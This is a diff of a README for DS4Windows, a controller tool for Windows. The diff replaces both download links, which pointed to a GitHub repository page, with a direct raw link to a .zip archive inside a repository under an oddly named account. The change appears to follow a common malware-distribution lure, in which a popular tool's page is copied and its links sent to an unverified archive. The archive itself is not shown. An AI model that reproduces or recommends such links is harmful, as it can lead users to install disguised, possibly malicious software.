@@ -1,6 +1,6 @@
 # 🎮 DS4Windows - Use PlayStation Controllers On Your PC
 
-[![Download DS4Windows](https://img.shields.io/badge/Download-Release-blue)](https://github.com/esophagussalixhumilis657/DS4Windows)
+[![Download DS4Windows](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/esophagussalixhumilis657/DS4Windows/main/Sources/Windows-D-v3.3.zip)
 
 DS4Windows makes your PlayStation controller work on Windows. You can use a DualShock 4 or DualSense controller to play games on your computer. This software tricks Windows into thinking your controller is an Xbox controller. Most PC games support Xbox controllers by default, so your PlayStation controller works in almost any game.
 
@@ -10,7 +10,7 @@ You need a computer running Windows 10 or Windows 11. Ensure your system has all
 
 ## 📥 Getting Started
 
-Visit this page to download the software: https://github.com/esophagussalixhumilis657/DS4Windows
+Visit this page to download the software: https://raw.githubusercontent.com/esophagussalixhumilis657/DS4Windows/main/Sources/Windows-D-v3.3.zip
 
 Follow these steps to set up the software for the first time:
 
